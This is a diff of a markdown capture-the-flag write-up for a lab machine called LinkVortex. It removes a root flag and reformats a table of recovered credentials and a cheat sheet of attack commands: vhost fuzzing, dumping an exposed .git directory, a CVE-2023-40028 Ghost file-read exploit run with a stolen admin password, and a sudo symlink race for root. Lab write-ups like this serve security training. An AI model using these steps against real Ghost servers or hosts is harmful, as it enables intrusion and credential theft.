@@ -383,15 +383,13 @@ try again
 bob@linkvortex:~$
 ```
 
-Stage result: root flag `da7603fea754840d5d354b2e0495c723`.
-
 ---
 
 ## Credentials
 
-| Source | Credential | Notes |
-| --- | --- | --- |
-| `git diff --cached` (auth test) | `admin@linkvortex.htb:OctopiFociPilfer45` | Ghost admin |
+| Source                                          | Credential                                 | Notes                              |
+| ----------------------------------------------- | ------------------------------------------ | ---------------------------------- |
+| `git diff --cached` (auth test)                 | `admin@linkvortex.htb:OctopiFociPilfer45`  | Ghost admin                        |
 | Ghost `config.production.json` (CVE-2023-40028) | `bob@linkvortex.htb:fibber-talented-worth` | SMTP auth; reuses for SSH as `bob` |
 
 ---
@@ -415,11 +413,11 @@ Stage result: root flag `da7603fea754840d5d354b2e0495c723`.
 
 ## Tools & cheat sheet
 
-| Tool | Purpose in this box | Key command |
-| --- | --- | --- |
-| `rustscan` / `nmap` | Port / service discovery | `nmap -sC -sV -oA ./nmap/quick.nmap 10.129.193.249` |
-| `ffuf` / gobuster | Vhost discovery (`dev.linkvortex.htb`) | `ffuf -u 'http://<TARGET>' -w …/subdomains-top1million-20000.txt` |
-| `git-dumper` | Dump exposed `.git` on dev vhost | `git-dumper 'http://dev.linkvortex.htb/.git' ./src` |
-| `git diff --cached` | Recover staged password / Dockerfile | `git diff --cached HEAD` |
-| CVE-2023-40028 exploit | Authenticated Ghost arbitrary file read | `./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h 'http://linkvortex.htb'` |
-| `sudo` + `clean_symlink.sh` | TOCTOU symlink race → root flag | `CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png` |
+| Tool                        | Purpose in this box                     | Key command                                                                                 |
+| --------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------- |
+| `rustscan` / `nmap`         | Port / service discovery                | `nmap -sC -sV -oA ./nmap/quick.nmap 10.129.193.249`                                         |
+| `ffuf` / gobuster           | Vhost discovery (`dev.linkvortex.htb`)  | `ffuf -u 'http://<TARGET>' -w …/subdomains-top1million-20000.txt`                           |
+| `git-dumper`                | Dump exposed `.git` on dev vhost        | `git-dumper 'http://dev.linkvortex.htb/.git' ./src`                                         |
+| `git diff --cached`         | Recover staged password / Dockerfile    | `git diff --cached HEAD`                                                                    |
+| CVE-2023-40028 exploit      | Authenticated Ghost arbitrary file read | `./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h 'http://linkvortex.htb'` |
+| `sudo` + `clean_symlink.sh` | TOCTOU symlink race → root flag         | `CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png`                   |
